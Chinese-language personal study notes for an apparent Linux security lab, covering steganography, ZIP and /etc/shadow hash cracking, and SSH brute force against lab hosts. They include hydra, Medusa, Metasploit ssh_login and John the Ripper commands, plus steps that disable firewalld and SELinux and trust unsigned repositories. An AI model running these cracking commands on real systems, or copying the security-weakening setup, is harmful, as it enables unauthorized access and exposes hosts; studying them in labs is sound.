

<a src = "https://autumncher.pixnet.net/blog/post/462809249-%E3%80%90centos7%E3%80%91%E5%A6%82%E4%BD%95%E9%87%8D%E7%BD%AEroot%E5%AF%86%E7%A2%BC-(how-to-recover-root-pas">centos7 重製 root 密碼</a>

 **[修改root密碼](https://www.tokfun.net/os/linux/reset-linux-ubuntu-user-root-password/)**: `sudo passwd root`

[修改putty 裡面的vim註釋顏色](https://stackoverflow.com/questions/5830125/how-to-change-font-color-for-comments-in-vim): `vim /etc/vim/vimrc`，按下大寫G到最後一行插入 `set background=dark`

[修改putty裡面的顏色](https://www.cnblogs.com/the-tops/p/5845481.html) 

[linux查看系統密碼](https://www.zymseo.com/big5/system_222990)

[winSCP:无权访问。 错误码：3 服务器返回的错误消息：Permission denied（真正解决方案）_执笔看墨花开的博客-CSDN博客_winscp无权访问](https://blog.csdn.net/qq_31201781/article/details/78919914?msclkid=3016cc97cddf11ec829742c85d8f0819)

如果SSH報錯，可以使用: `sshd -T` 查看錯誤原因



密碼破解法: [Linux下的密碼Hash](https://ppfocus.com/0/te36df45d.html)、[密碼字典檔生成工具 - crunch](https://ithelp.ithome.com.tw/articles/10215234)



## 題目



1. 找出output.png裡面藏的東西
2. 解壓縮a.zip，取出內容
   * 解壓縮a.zip裡面有密碼，a.zip裡面放什麼檔案 `使用 kali fcrackzip，fcrackzip -v -b -u -l 3-8 -cl a.zip`
3. 找出a.txt、b.txt、c.txt原本的文字
   * 找出a.txt、b.txt、c.txt原本的文字，建議從c.txt開始做，裡面有一些是經過多次加密
4. 找出gif的圖片文字(`convert in.gif[{0..9}] out.png ##把gif轉png`)
5. 破解ubuntu裡面的三個使用者的密碼

1.find the files that have been changed 6 days ago but within14 days. Also the file size should be less than 1M. When you find those files copy them into /tmp. (One command to do the above mentioned job)

2. find the files under / etc that contains "localhost".

魔王題目: 192.168.60.3 裡面的 /root/flag.txt ??，需要連接學校網路才可以做



## 暴力破解

> [字典生成----在线密码破解工具hydra和medusa的使用](https://blog.csdn.net/weixin_44847002/article/details/106627562)

**hydra、patator密碼破解: [Linux SSH密碼暴力破解技術及攻擊實戰](https://www.itread01.com/content/1517203343.html)**

可以使用crunch生成字典: [Linux下的字典生成工具Crunch，創造自己的專屬字典](https://kknews.cc/zh-tw/code/5lnrk96.html)、[如何用crunch生成字典](https://zhuanlan.zhihu.com/p/137674478)，`apt install crunch`

找到charset.lst的路徑(`whereis crunch`)

```
 # 找到路徑創建字典
crunch 1 8 -f /usr/share/crunch/charset.lst .lst mixalpha-numeric-all-space -o wordlist.txt
# 這個創建會超大 53TB ?!
```

線上字典檔案(15GB) [CrackStation's Password Cracking Dictionary](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

#### 使用hydra

```
sudo apt-get update
sudo apt-get install hydra

/*sudo add-apt-repository "deb [trusted=yes] http://archive.ubuntu.com/ubuntu/ saucy universe multiverse"  ## 新增 deb http://archive.ubuntu.com/ubuntu/ saucy universe multiverse" 到 /etc/apt/sources.list
sudo apt-get update*/



```

在 `sudo apt-get update`出現`updating from such a repository can't be done securely`

```
vim /etc/apt/sources.list
deb [trusted=yes] https://archive.deb-multimedia.org/ jessie main ## 加入到最尾端
```

之後再輸入`sudo apt-get update`會出現`gpg error `，後面有一串: ` the public key is not available: NO_PUBKEY 5C808C2B65558117`，把數字新增到apt-key裡面

```
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 5C808C2B65558117
apt-key list  ## 查看新增的key
```

之後就可以`sudo apt-get`了!!



```
sudo apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev libncp-dev hydra
```

libncp-dev 裝不了，apt-get update一直抱錯QQ







下面是另一種裝法，使用git

```
sudo apt-get -y install build-essential
sudo apt-get install git
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
make install
```





Remove hydra

```
sudo apt-get purge hydra-gtk
sudo apt-get autoremove
sudo apt-get autoclean
## 也可以寫成下面一行
sudo apt-get purge hydra-gtk && sudo apt-get autoremove && sudo apt-get autoclean
```





#### 使用Medusa

[利用kali中的medusa進行ssh密碼檢測](https://kknews.cc/zh-tw/code/6py5e8p.html)

```
apt install git
git clone https://github.com/jmk-foofus/medusa.git
```



需要先載gcc和libssl-dev才能使用configure產生Makefile

```
apt install gcc
apt-get install libssl-dev
./configure   ## 在medusa下使用
make
make install
```



#### 使用John the Ripper(JTR)

[John the Ripper (JTR) 密碼破解簡單使用教學](https://sa.ddns.net/wp/index.php/2020/07/10/901/)

[Linux 的 /etc/shadow 檔案結構：儲存真實密碼的地方](https://blog.gtwang.org/linux/linux-etc-shadow-file-format/)

> 有了shadow檔和passwd檔案，就可以使用這個工具破解密碼

沒有用QQ

先把密文存成一個檔案test01.txt，再使用 john -si test01.txt

```
M2Y5WVU4nQNK6
M2AERmE1jWn2E
M2dkTuewmYzJY
M2GMcSXbX0v6E
```



```
sudo apt update
sudo apt install snapd
sudo snap install john-the-ripper
john -si test01.txt  ## 簡單模式
john -w:j2.txt test01.txt  ## 字典模式
# /snap/bin/john/j2.txt
john -i test01.txt  ## 窮舉模式
john --incremental --format=md5crypt test01.txt  ## 暴力破解
```







wifi密碼破解: [黑客暴力破解必備的12大逆向工具](https://kknews.cc/zh-tw/code/22xkgag.html)





#### 使用遠端破解密碼

SSH: [Gain SSH Access to Servers by Brute-Forcing](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/)、[hydra破解工具](https://tw511.com/a/01/33673.html)

可以使用單人模式進行破解

但我們這裡使用`nmap`和`hydra`進行破解

nmap: 可以獲得虛擬機的資訊

hydra: 可以對帳號密碼使用暴力破解，不過需要提供字典，可以上網使用rockyou.txt

```
sudo apt-get install nmap  ## 安裝套件，centos 使用 yum install nmap

nmap -A 192.168.157.0/24  ## 對目前的區域網路進行掃瞄，會拿到有連線到目前區域的IP(192.168.157.128)

ssh user1@192.168.157.128  ## 需要使用者帳密
```



```
sudo apt install hydra  ## 安裝套件

hydra -l user.txt -P passwords.txt -t 4 192.168.157.128 ssh  ## -t代表開4個線程，比較快
```

上面hydra可以遠端破解，可以把user.txt檔案裏面的user使用password.txt暴力破解













[centos install msfconsole](https://computingforgeeks.com/install-metasploit-framework-on-centos-linux/)

[centos install hydra](https://installati.one/centos/7/hydra/)

 yum install -y dnf 

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

chmod +x msfinstall

./msfinstall

msfdb init 
```

user: y，password: 沒有

```
msfconsole
search ssh   ## search scanner/ssh
use auxiliary/scanner/ssh/ssh_login
options
set rhosts [172.16.1.102](target IP)
set stop_on_success true
set user_file users.txt
set pass_file passwords.txt
set verbose true
run
```

[rockyou.txt](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz): https://github.com/praetorian-inc/Hob0Rules

[user.txt](https://github.com/ThomasTJdev/WMD/blob/master/files/user.txt): https://github.com/ThomasTJdev/WMD







#### 關閉防火牆和保護裝置

* `apt install openssh-server`: ssh網路套件安裝 

* `setenforce 0`: 可以暫時關掉上面的防火牆

* `systemctl [action] [server]`: 可以啟動服務，這個命令需要root權限 `su`

  ```
  action: start、stop、restart、status、disable、enable
  server: httpd、sshd、firewalld
  
  systemctl status firewalld  // 查看防火牆狀態
  systemctl disable firewalld  // 之後開機防火牆都會關閉
  systemctl stop firewalld  // 防火牆馬上關閉
  // 後面的 d 代表 daemon  (守護進程)
  ```

* `getenforce`: 確認Linux強大的防火牆有沒有開啟，如果SELINUX選項是enforce，就會讓其他人無法連到，需要跟改系統文件內容

  * `gedit /etc/selinux/config` : 使用圖形化界面修改文件
  * `SELINUX=disabled`
  * 重開機





破解壓縮檔案密碼

[破解ZIP 密碼的四大方法](https://www.monspy.com/crack-zip-password/)

[fcrackzip](https://www.796t.com/article.php?id=254129)

[How to crack zip password on Kali Linux](https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux)



```
sudo apt install fcrackzip
## -b 是暴力破解，-c 為指定字串指定A為大寫A-Z，1為數字0-9， -l 指定位數， -u 僅顯示破解出來的密碼
fcrackzip -b -c 'a1' -l 1-5 -u a.zip  
fcrackzip -D -u -p rockyou.txt a.zip

```





查看圖片文字

[查看圖片詳細情況](https://www.netadmin.com.tw/netadmin/zh-tw/technology/C97145B13825464CB1F293223D009A7B)

```
apt install ruby
gem install zsteg
zsteg -a output.png  ## -a 查看全部情況
```



[extract text from images](https://askubuntu.com/questions/59389/how-can-i-extract-text-from-images)

[windows藏檔案到圖片](https://kknews.cc/zh-tw/news/mmjn969.html)

安裝Homebrew，可以使用brew為tesseract安裝語言包

```
sudo apt-get install build-essential curl file git
## 下面這部不能用root執行，要用一般使用者
sh -c "$(curl -fsSL https://raw.githubusercontent.com/Linuxbrew/install/master/install.sh)"
export PATH="/home/linuxbrew/.linuxbrew/bin:$PATH"
brew install tesseract-lang
```



> 下面無法成功

```
sudo apt-get install tesseract-ocr
apt install imagemagick-6.q16
convert output.png  -bordercolor White -border 10x10 output.png
tesseract filename.jpg output.txt
tesseract filename.jpg stdout  ## 顯示到螢幕上
tesseract filename.jpg stdout --dpi 72  ## 加上dpi(70~2400)，有點像解析度的東東
```







[evalsciencet靶機通關筆記](https://www.796t.com/article.php?id=84277): 這個寫的很好，入侵靶機

[鳥哥的 Linux 私房菜](https://linux.vbird.org/history.php): 這個網站可以



[MD5破解網站](https://www.cmd5.com/)

[編碼/解碼網站](https://toolbox.googleapps.com/apps/encode_decode/?lang=zh-TW)

[密碼類型判斷](https://blog.csdn.net/nineqblot/article/details/91994497)



**[使用johnny進行密碼破解](https://www.it145.com/9/56305.html)**

**[使用python對SHA進行暴力破解](https://blog.csdn.net/happyjacob/article/details/109706251)**

